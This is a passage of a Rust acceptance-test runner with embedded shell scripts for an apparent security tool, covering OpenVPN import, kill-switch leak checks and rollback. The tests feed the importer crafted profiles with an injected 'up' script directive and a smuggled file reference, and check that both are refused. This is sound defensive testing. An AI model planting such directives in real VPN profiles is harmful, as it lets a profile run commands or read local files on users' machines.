if sudo ibexctl plan net.vpn --set action=import --set name=bad --set-file profile=/tmp/bad1.ovpn --json >/dev/null 2>&1; then echo "AN up SCRIPT WAS ACCEPTED"; exit 1; fi
sed 's/^remote-cert-tls server$/remote-cert-tls server\nca \/etc\/ca.crt/' /tmp/lab.ovpn > /tmp/bad2.ovpn
if sudo ibexctl plan net.vpn --set action=import --set name=bad --set-file profile=/tmp/bad2.ovpn --json >/dev/null 2>&1; then echo "A FILE REFERENCE WAS ACCEPTED"; exit 1; fi
sudo ibexctl plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.ovpn --json > /tmp/ovpn-plan.json || { echo "THE PROFILE WAS REFUSED:"; cat /tmp/ovpn-plan.json; exit 1; }
if grep -q "BEGIN PRIVATE KEY\|BEGIN EC PRIVATE KEY" /tmp/ovpn-plan.json; then echo "A PRIVATE KEY IS IN THE PREVIEW"; exit 1; fi
FOREIGN=$(foreign_digest)

apply_plan net.vpn --set action=import --set name=lab --set-file profile=/tmp/lab.ovpn
if echo "$OUT" | grep -q pending_confirm; then confirm_tx; fi
IMPORT_TX=$TX
sleep 2
sudo nmcli -g vpn.service-type connection show ibexwall-lab | grep -q org.freedesktop.NetworkManager.openvpn || { echo "NETWORKMANAGER DID NOT TAKE THE PROFILE"; sudo nmcli connection show | head; exit 1; }
[ "$(sudo stat -c %a /etc/ibexwall/vpn/openvpn/lab/key.pem)" = 600 ] || { echo "THE KEY FILE IS NOT PRIVATE"; exit 1; }
echo "METRIC: an OpenVPN profile imported: NetworkManager shows type vpn / openvpn, files 0600, key absent from the preview, up and file directives refused"

tunnel_down() { sudo nmcli connection down ibexwall-lab >/dev/null 2>&1 || true; }
tunnel_up() { sudo nmcli connection up ibexwall-lab >/tmp/ovpn-up.txt 2>&1 || return 1; for i in $(seq 1 25); do ping -c1 -W1 10.200.0.1 >/dev/null 2>&1 && return 0; sleep 1; done; return 1; }
leak_count() {
  sudo rm -f /tmp/leak2.pcap
  sudo timeout 14 tcpdump -n -i "$IFACE" -w /tmp/leak2.pcap "ip and not host $PEER and not (udp and (port 67 or port 68))" >/dev/null 2>&1 &
  TD=$!
  sleep 2
  timeout 4 curl -s -m 3 http://1.1.1.1 >/dev/null 2>&1 || true
  timeout 4 ping -c2 -W1 8.8.8.8 >/dev/null 2>&1 || true
  timeout 4 getent hosts example.org >/dev/null 2>&1 || true
  wait $TD 2>/dev/null || true
  sudo tcpdump -nr /tmp/leak2.pcap 2>/dev/null | wc -l
}
{
  tunnel_up || { echo "THE OPENVPN TUNNEL DID NOT COME UP"; cat /tmp/ovpn-up.txt; sudo journalctl -u NetworkManager -n 8 --no-pager | tail -6; sudo tail -8 /tmp/ovpn-server.log; sudo journalctl -u NetworkManager --no-pager | grep -E "nm-openvpn" | tail -14; exit 1; }
  echo "METRIC: the OpenVPN tunnel came up through NetworkManager and carries traffic"
  # The kill switch knows the server from the imported record, and protects a tun device.
  apply_plan net.vpn --set action=killswitch --set allow=$PEER
  if echo "$OUT" | grep -q pending_confirm; then confirm_tx; fi
  KS_TX=$TX
  ping -c2 -W2 10.200.0.1 >/dev/null || { echo "THE TUNNEL STOPPED WORKING UNDER THE KILL SWITCH"; exit 1; }
  tunnel_down
  LEAK=$(leak_count)
  [ "$LEAK" = 0 ] || { echo "LEAK: $LEAK packets left the uplink with the OpenVPN tunnel down"; sudo tcpdump -nr /tmp/leak2.pcap 2>/dev/null | head -6; exit 1; }
  tunnel_up || { echo "THE OPENVPN TUNNEL COULD NOT RECONNECT UNDER THE KILL SWITCH"; cat /tmp/ovpn-up.txt; exit 1; }
  echo "METRIC: with the kill switch and the OpenVPN tunnel down, 0 packets left the uplink, and it reconnected"
  tunnel_down
  sudo ibexctl rollback "$KS_TX" >/dev/null || { echo "KILL SWITCH ROLLBACK FAILED"; exit 1; }
}
sudo ibexctl rollback "$IMPORT_TX" >/dev/null || { echo "ROLLBACK FAILED"; exit 1; }
sleep 2
sudo test ! -e /etc/ibexwall/vpn/openvpn/lab/key.pem || { echo "THE KEY SURVIVED THE ROLLBACK"; exit 1; }
if sudo nmcli connection show ibexwall-lab >/dev/null 2>&1; then echo "THE PROFILE SURVIVED THE ROLLBACK"; exit 1; fi
[ "$(foreign_digest)" = "$FOREIGN" ] || { echo "ANOTHER TABLE CHANGED"; exit 1; }
sudo pkill -x openvpn 2>/dev/null || true
sudo nmcli connection delete ibxup >/dev/null 2>&1 || true
sudo ip netns del vpnsrv; sudo ip link del vethc 2>/dev/null || true; sudo ip link del ibxbr0 2>/dev/null || true
echo "METRIC: rolled back: files, NetworkManager's profile gone, foreign tables identical"
"#;

pub fn run(vm: &Vm, workspace: &Path, install: &str) -> Result<()> {
    println!("== f9: build ==");
    let mut args = vec!["build".to_string(), "--release".to_string()];
    for id in PLUGINS {
        args.push("-p".into());
        args.push(format!(
            "ibexwall-plugin-{}",
            id.rsplit('.').next().unwrap()
        ));
    }
    for package in ["ibexwall-exec", "ibexwall-cli", "ibexwall-core"] {
        args.push("-p".into());
        args.push(package.into());
    }
    args.push("--bins".into());
    run_capture("cargo", args, None, "building the F9 plugins")?;
    crate::devkey::run()?;
    provision(vm, workspace, install)?;
    for id in PLUGINS {
        install_plugin(vm, workspace, id)?;
    }
    start_daemon(vm)?;

    let mut failures = 0;
    macro_rules! scenario {
        ($name:expr, $body:expr) => {
            if !run_script(vm, $name, &[LIB, $body].concat()) {
                failures += 1;
            }
        };
    }

    scenario!(
        "e1 endpoint.isolate: the network is cut except the allow list, then comes back, or reverts unconfirmed",
        ISOLATE
    );

    scenario!(
        "p1 endpoint.persistence: the places a program stays are watched against an accepted baseline",
        PERSISTENCE
    );

    scenario!(
        "i1 endpoint.integrity: an altered installed file is found, configuration stays out",
        INTEGRITY
    );

    scenario!(
        "a1 endpoint.av: EICAR is flagged by ClamAV and YARA, scans can be scheduled and undone",
        AV
    );

    scenario!(
        "v1 net.vpn: a WireGuard profile comes up through NetworkManager, and a dropped tunnel leaks nothing under the kill switch",
        VPN
    );

    scenario!(
        "v2 net.vpn: an OpenVPN profile (a documented subset) is imported, carries traffic and is rolled back",
        OPENVPN
    );

    if failures == 0 {
        println!("PASS: f9 acceptance suite (all scenarios)");
        Ok(())
    } else {
        anyhow::bail!("{failures} f9 scenario(s) failed")
    }
}
